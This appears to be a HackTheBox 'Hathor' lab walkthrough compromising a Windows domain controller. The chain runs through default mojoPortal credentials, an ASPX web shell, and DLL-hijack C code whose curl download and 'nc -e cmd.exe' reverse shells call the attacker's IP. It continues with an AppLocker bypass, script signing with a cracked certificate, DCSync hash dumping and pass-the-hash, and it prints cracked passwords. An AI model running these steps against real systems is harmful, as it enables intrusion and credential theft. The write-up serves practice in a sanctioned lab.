# HackTheBox - Hathor

## NMAP

```bash
PORT      STATE SERVICE       VERSION                                  
53/tcp    open  domain?
| fingerprint-strings:             
|   DNSVersionBindReqTCP:
|     version
|_    bind                               
80/tcp    open  http          Microsoft IIS httpd 10.0                                 
|_http-favicon: Unknown favicon MD5: DCF8D506B68E858EE6F83FB988066A57  
| http-methods:     
|   Supported Methods: GET HEAD OPTIONS TRACE POST
|_  Potentially risky methods: TRACE
| http-robots.txt: 29 disallowed entries (15 shown)
| /CaptchaImage.ashx* /Admin/ /App_Browsers/ /App_Code/ 
| /App_Data/ /App_Themes/ /bin/ /Blog/ViewCategory.aspx$ 
| /Blog/ViewArchive.aspx$ /Data/SiteImages/emoticons /MyPage.aspx 
|_/MyPage.aspx$ /MyPage.aspx* /NeatHtml/ /NeatUpload/
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Home - mojoPortal
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-21 12:39:05Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=hathor.windcorp.htb
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername:<unsupported>, DNS:hathor.windcorp.htb
| Issuer: commonName=windcorp-HATHOR-CA-1
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-03-18T07:51:40
| Not valid after:  2023-03-18T07:51:40
| MD5:   ccb0 22ba 7668 9b5b ab85 038c 5b18 1913
|_SHA-1: 2a0b a4da 1f04 33a7 e1a8 14d1 1dd3 6893 9eda 96e7
|_ssl-date: 2022-04-21T12:42:10+00:00; -1s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername:<unsupported>, DNS:hathor.windcorp.htb
| Issuer: commonName=windcorp-HATHOR-CA-1
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-03-18T07:51:40
| Not valid after:  2023-03-18T07:51:40
| MD5:   ccb0 22ba 7668 9b5b ab85 038c 5b18 1913
|_SHA-1: 2a0b a4da 1f04 33a7 e1a8 14d1 1dd3 6893 9eda 96e7
|_ssl-date: 2022-04-21T12:42:11+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername:<unsupported>, DNS:hathor.windcorp.htb
| Issuer: commonName=windcorp-HATHOR-CA-1
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49697/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
61813/tcp open  msrpc         Microsoft Windows RPC
```

## PORT 80 (HTTP)

On the web page we get a page under consturction page also at the bottom we can sess an option to login

<img src="https://i.imgur.com/B0lf65o.png">

<img src="https://i.imgur.com/npLACTo.png">

Since we don't know the creds, we can try the default one but they didn't worked

<img src="https://i.imgur.com/SWDFzkp.png"/>

Running `disearch` to fuzzz for files and directories with don't get anyhting as most of the paths we get result in 403 status code

<img src="https://i.imgur.com/xSqGdRh.png"/>

<img src="https://i.imgur.com/HpPrUZo.png"/>

Looking at `robots.txt` we do get some entries

<img src="https://i.imgur.com/jcWwzhC.png"/>

But still we were either getting 403,page not found or redirecting us back to login page except for `/Setup` which only tells that setup is disabled

<img src="https://i.imgur.com/7PdcTpF.png"/>

So in the end I decided to just sign up for an account

<img src="https://i.imgur.com/kEPKuZd.png"/>

And after logging there wasn't anything that we could do with a normal user on this site

<img src="https://i.imgur.com/Nvo7d9t.png"/>

After looking for default credentials which I should have done that before, found a forum for mojoportal which talks about the default admin username to be `admin@admin.com` and the password `admin`

<img src="https://i.imgur.com/5nzBLlV.png"/>

https://www.mojoportal.com/Forums/Thread.aspx?pageid=5&t=2902~-1

<img src="https://i.imgur.com/DE27O3Q.png"/>

<img src="https://i.imgur.com/vrBlCNO.png"/>

<img src="https://i.imgur.com/fCXUYx7.png"/>

This worked and we are now  logged in as the administrator

<img src="https://i.imgur.com/RvqQlcT.png"/>

There were a lot of options and I spend a lot of time in understanding what do I need to do here as there wasn't any blog talking about exploits that could give you rce

<img src="https://i.imgur.com/yJ2yuOl.png"/>

In filemanager we do see an option to upload files, since this is a windows server, it will be executing aspx files so we need to upload aspx to get command execution, I created a simple aspx file to test if we can upload this file

<img src="https://i.imgur.com/Hj6G00l.png"/>

<img src="https://i.imgur.com/09qAmLX.png"/>

This gives us an error, so we are not allowed to upload aspx files, instead of uploading an apsx file we can copy the contents and change the extension

<img src="https://i.imgur.com/Au4mxGN.png"/>

<img src="https://i.imgur.com/3qkGeov.png"/>

It won't show that our aspx file is copied in the current directory

<img src="https://i.imgur.com/wKHQ1bq.png"/>

If we check the `System logs` we'll see a path  ` /Data/Sites/1/media/` which is supposed to where that `htmlfragment` directory is 

<img src="https://i.imgur.com/G3OP5iJ.png"/>

<img src="https://i.imgur.com/HDbOL4P.png"/>

This was is loading the htm file that we just edit but it wasn't loading the aspx file for some reason

<img src="https://i.imgur.com/izPqSbV.png"/>

So I just went with copy pasting aspx web shell which I found from github and see if that will work as  maybe need to import something to execute aspx files

https://raw.githubusercontent.com/tennc/webshell/master/Backdoor%20Dev%20Shells/devshell.aspx

<img src="https://i.imgur.com/HFxNypp.png"/>

<img src="https://i.imgur.com/OUwqd8g.png"/>

And after editing and copying the file with aspx , visiting the link again, the aspx web shell worked

<img src="https://i.imgur.com/5moRKhL.png"/>

We can execute the commands as the web user

<img src="https://i.imgur.com/VogW6RS.png"/>

Looking at the perrmissions of this user, we are not in any interesting groups

<img src="https://i.imgur.com/m33rw5B.png"/>

Going into `C:\Users` we see some users 

<img src="https://i.imgur.com/VFgYVxP.png"/>

In C:\ dirve we see an interesting folder called `Get-bADpasswords` which is a powershell script that is use for finding bad or weak passwords for the AD users

https://github.com/improsec/Get-bADpasswords

<img src="https://i.imgur.com/EIAh48x.png"/>

We can get the results of this tool by going to `C:\Get-bADpasswords\Accessible\CSVs`

<img src="https://i.imgur.com/JF6T09d.png"/>

Downloading the csv file we can see that `BeatriceMill` has a weak passsword and the hash of this account is `9cb01504ba0247ad5c6e08f7ccae7903`. I used crackstation to see if we can crack this hash 

<img src="https://i.imgur.com/Wuif1Kf.png"/>

<img src="https://i.imgur.com/yXXJYRw.png"/>

But we weren't able to authenticate on smb, so I tried to use the credentials on ldap by using `windapsearch`

```bash
windapsearch --dc 10.10.11.147 -d 'windcorp' -u 'BeatriceMill' -p '!!!!ilovegood17' -m users
```

<img src="https://i.imgur.com/95L149r.png"/>

<img src="https://i.imgur.com/mXWquhH.png"/>

This returned `3538` users so could be that we are not allowed to access smb but still it's an issue that we can't remote access through Beatrice if either smb or winrm is not available to us

To get a shell as Beatrice we can abuse IIS impersonatioin that will allow the web application to run the code under Beatrice 

https://docs.microsoft.com/en-us/troubleshoot/developer/webapps/aspnet/development/implement-impersonation

By following this we can copy the code for impersonatioin for `Visual C# .NET`

<img src="https://i.imgur.com/XaQVc4R.png"/>

<img src="https://i.imgur.com/R2denGt.png"/>

In this section of the code we can call the aspx reverse shell function also replace the username,domain and the password for Beatrice so the final aspx file would look like this 

https://gist.github.com/AbdullahRizwan101/62cd19d0ad3ac2ebafcd6f4a9cea63c1

https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx

After uploading it and getting a reverse shell as `BeatriceMill`

<img src="https://i.imgur.com/dwZNSjs.png"/>

Looking into `C:\` we can see a folder named `share`

<img src="https://i.imgur.com/wzLriSe.png"/>

Here there's `autoit3` and furhter going into `scripts` folder we can see an autoit3 script having 7zip script and a dll, we can check the autoit3 script it's using that dll 

<img src="https://i.imgur.com/Dcr2KBb.png"/>

<img src="https://i.imgur.com/PZfdOfk.png"/>

<img src="https://i.imgur.com/fLDvkdJ.png"/>

This is where we can do an attack called `DLL Hijacking` where we would be replacing contents of `7-zip64.dll` and let the autoit3 execute the 7zip script allowing it to run our dll

https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking

We can try making the dll execute `whoami` command to see with which user this script is being executed

```c++
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
 
            system("whoami > C:\\Windows\\Temp\\uwu.txt");
 
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}

```
Compiling it to a windows shared library using  `mingw32`

https://stackoverflow.com/questions/2033997/how-to-compile-for-windows-on-linux-with-gcc-g

```bash
x86_64-w64-mingw32-gcc ./check.c -shared -o 7-zip64.dll
```

<img src="https://i.imgur.com/3kvNo55.png"/>

And after a few minutes we'll see the text file which we appended the output of `whoami` command resulting to the user `ginawild`

<img src="https://i.imgur.com/XHxg6XW.png"/>

But getting a reverse shell wasn't simple as either netcat or a reverse shell payload was being flagged and getting removed 

So checking the `Applocker` with the powershell command 

```powershell
Get-AppLockerPolicy -effective -xml
```

<img src="https://i.imgur.com/CBxr2wz.png"/>

This returned a lot of stuff, so we need to transfer it to our host machine, I used `tmux`'s copy option by using the prefix keys `ctrl+b + [` to enter in copy mode , then `ctrl+space` to start copy selection , `ctrl+w` to end selection  and `ctrl+b +]` to paste in tmux pane

<img src="https://i.imgur.com/jC8GfSX.png"/>

<img src="https://i.imgur.com/6qT4eWX.png"/>

We can then just save this in a file and open the xml in a browser

<img src="https://i.imgur.com/S07FaJv.png"/>

Our focus should be on exe as we want to run netcat, so expanding this, we'll see a policy for allowing exe file to be executed

<img src="https://i.imgur.com/243K5ZY.png"/>

Here it's allowing `Bginfo64.exe` to be executed and it's not checking the hash of the file so we could replace it with our `nc.exe` and make it execute it through that dll but before that let's see what permissions are there for Bginfo exe

<img src="https://i.imgur.com/IQ8nFyi.png"/>

https://superuser.com/questions/322423/explain-the-output-of-icacls-exe-line-by-line-item-by-item

<img src="https://i.imgur.com/qJDqyYL.png"/>

Checking what these permissions mean, the `ITDep` group has read,execute and is a write owner for this exe, ginawild belongs to this group so we can replace this with `nc64.exe `through the dll and also make it execute it 

Make sure to use 1.12 version of netcat from here as the defender is going to flag it.

https://eternallybored.org/misc/netcat/

<img src="https://i.imgur.com/N0ThMr4.png"/>

```c++
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
 
            system("curl 10.10.14.18:3333/nc64.exe -o C:\\share\\Bginfo64.exe);
 
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}

```

After it's going to be replaced we can then get a reverse shell

```c++
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
 
            system("C:\\share\\Bginfo64.exe 10.10.14.18 5555 -e cmd.exe");
 
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

<img src="https://i.imgur.com/ktxGeb8.png"/>

After having a reverse shell as gina, I didn't found anything in directories but in the recycle bin there was a pfx file that we can read

https://superuser.com/questions/395015/how-to-open-the-recycle-bin-from-the-windows-command-line

<img src="https://i.imgur.com/swukvQL.png"/>

<img src="https://i.imgur.com/VtG2QL7.png"/>
										   
If we try to read this pfx file, it's protected with a password

<img src="https://i.imgur.com/oxzasTj.png"/>

I tried using beatrice's password but the shell got hung up, so to transfer this on my host machine I used `cerutil` to convert the contents to base64

```powershell
certutil -encode .\cert.pfx cert.b64
```

<img src="https://i.imgur.com/fH2ZVDH.png"/>

But we don't want `BEGIN CERTIFICATE` as it won't get deecoded properly, we can remove these keywords with 

```bash
findstr /v CERTIFICATE .\cert.b64 > removed_headers.b64
```

<img src="https://i.imgur.com/DFA9e4Z.png"/>

Copied the content into the tmux buffer and pasted on my terminal

<img src="https://i.imgur.com/G3gL5eA.png"/>

<img src="https://i.imgur.com/yLJ2Ors.png"/>

Using `pfx2john` we can generate the pfx hash and crack it using `john`

```bash
python2 /opt/john/run/pfx2john.py ./cert.pfx > hash
```

<img src="https://i.imgur.com/ty1Cshj.png"/>

```bash
john ./hash --wordlist=/opt/SecLists/Passwords/rockyou.txt
```

<img src= "https://i.imgur.com/SinB8t3.png" />

Now with this pfx certificate we can sign a powershell script and let it execute because if we go back to `C:\Get-bADpasswords`, the script `Get-bADpasswords.ps1` is being executed through a background process and it's signed 

<img src="https://i.imgur.com/pgMn5Rr.png"/>

Checking what permissions are there on this script

<img src="https://i.imgur.com/nyUkd1q.png"/>

We have the permissions to modify this script, so let's try replacing the contents to execute netcat which is the Bginfo64.exe

```powershell
Start-Process -FilePath "C:\Share\Bginfo64.exe" -ArgumentList "10.10.16.20 7777 -e powershell.exe"
```

<img src="https://i.imgur.com/x4fVtLM.png"/>

Right now, this script isn't signed, so it can't be run on the system

<img src="https://i.imgur.com/N0xvSPh.png"/>

We can sign this powershell script with 

```powershell
$CertPath ="C:\Get-bADpasswords\cert.pfx"
$CertPass = "abceasyas123"
$Cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($CertPath, $CertPass)
Set-AuthenticodeSignature -Certificate $Cert -FilePath C:\Get-bADpasswords\Get-bADpasswords.ps1
```

But it didn't work as the powershell was running in constrained mode

<img src="https://i.imgur.com/u62NXJO.png"/>

There's a tool to sign to sign the files called `signtool` 

https://docs.microsoft.com/en-us/windows/win32/seccrypto/signtool

Issue is that we can't download it directly, we need to install Windows Development kit, so I had to switch to my windows machine and install the developement kit only which is about 1.9 GB

<img src="https://i.imgur.com/sK4mDxj.png"/>

After installing the development kit, it should be in 

```
C:\Program Files (x86)\Windows Kits\10\bin\x64
```

<img src="https://i.imgur.com/DfrwhB6.png"/>

Transferred `signtool.exe` on the target machine and then ran the command to sign the script

https://www.praveenc.com/posts/code-signing-on-windows/

```powershell
.\signtool.exe sign /f C:\Users\ginawild\cert.pfx /p abceasyas123 C:\Users\ginawild\Get-bADpasswords.ps1


.\signtool.exe sign /f C:\Users\ginawild\cert.pfx /p abceasyas123 C:\Users\ginawild\Get-bADpasswords.ps1
```

<img src="https://i.imgur.com/TSkNw4c.png"/>

<img src="https://i.imgur.com/ilj9drA.png"/>

After this copy it to `C:\Get-bADpasswords` and run `run.vbs` to trigger this powershell script

<img src="https://i.imgur.com/215jCUp.png"/>

<img src="https://i.imgur.com/8eQAZaU.png"/>

<img src="https://i.imgur.com/BUYRdTG.png"/>

Now getting a shell as this user, we can see a folder named `Credentials` in Documents folder having a passowrd in form of secure string

<img src="https://i.imgur.com/t3pWGRK.png"/>

## Rabbit Hole

Reading this file we get a secure string password

<img src="https://i.imgur.com/DkKFVe1.png"/>

I looked up a video by ippsec on Reel machine in which he showcased how to convert it back to plain text

https://www.youtube.com/watch?v=ob9SgtFm6_g&t=1973s&ab_channel=IppSec

<img src="https://i.imgur.com/deUwqx6.png"/>

<img src="https://i.imgur.com/WErlOjX.png"/>

<img src="https://i.imgur.com/UR7xLfL.png"/>

But this password wasn't for bpassrunner as there was user called `mailuser` in the username  folder so this was a rabbit hole

<img src="https://i.imgur.com/yjmhW87.png"/>


Checking in in which groups this user belongs to

<img src="https://i.imgur.com/Xtd0xPy.png"/>

We are in `Account Operators` group with which can we add users into the domain

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-accounts-and-token-privileges

<img src="https://i.imgur.com/8dqBIu0.png"/>

So after digging too much for, this account had replicatioin rights , meaning that we can get the hash of any user we want 

https://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/

```powershell
Get-ADReplAccount -SamAccountName Administrator -Server 'hathor.windcorp.htb'
```

<img src="https://i.imgur.com/UK24poz.png"/>

But this wasn't working on winrm or on smb

<img src="https://i.imgur.com/wsLepBf.png"/>

We can get a golden ticket for the administrator using impacket's `get-TGT.py`

<img src="https://i.imgur.com/V1aqF2y.png"/>

It gives an error regarding "Clock skew too great", we just need to synchronize the time with domain controller using `ntpdate windcrop` and want the ntp to set to false as it's going to keep updating the time zone

```bash
timedatectl set-ntp false
sudo ntpdate windcorp
```

```bash
sudo python3 /opt/impacket/examples/getTGT.py windcorp.htb/Administrator -hashes :b3ff8d7532eef3
96a5347ed33933030f
```

<img src="https://i.imgur.com/9pB1CoF.png"/>

<img src="https://i.imgur.com/pP4JCsm.png"/>

We can also dump NTDS.dit using the administrator's ticket

<img src="https://i.imgur.com/8hskub1.png"/>

## References
- https://www.mojoportal.com/Forums/Thread.aspx?pageid=5&t=2902~-1
- https://github.com/tennc/webshell/blob/master/Backdoor%20Dev%20Shells/devshell.aspx
- https://github.com/improsec/Get-bADpasswords
- https://github.com/borjmz/aspx-reverse-shell
- https://www.faqforge.com/powershell/get-list-windows-powershell-modules-can-imported/
- https://docs.microsoft.com/en-us/troubleshoot/developer/webapps/aspnet/development/implement-impersonation
- https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx
- https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking
- https://stackoverflow.com/questions/2033997/how-to-compile-for-windows-on-linux-with-gcc-g
- https://www.youtube.com/watch?v=ob9SgtFm6_g&t=1588s
- https://superuser.com/questions/322423/explain-the-output-of-icacls-exe-line-by-line-item-by-item
- https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration
- https://stackoverflow.com/questions/28625178/bash-certutil-command-not-found
- https://dmfrsecurity.com/2017/01/07/windows-base64-encoding-and-decoding-using-certutil/
- https://docs.microsoft.com/en-us/windows/win32/seccrypto/signtool
- https://stackoverflow.com/questions/31869552/how-to-install-signtool-exe-for-windows-10 
- https://www.praveenc.com/posts/code-signing-on-windows/
- https://eternallybored.org/misc/netcat/
- https://www.youtube.com/watch?v=ob9SgtFm6_g&t=1973s&ab_channel=IppSec
- https://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/
- https://techdirectarchive.com/2020/04/07/how-to-synchronizing-linux-system-clock-with-a-network-time-protocol-ntp-server/
- https://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/
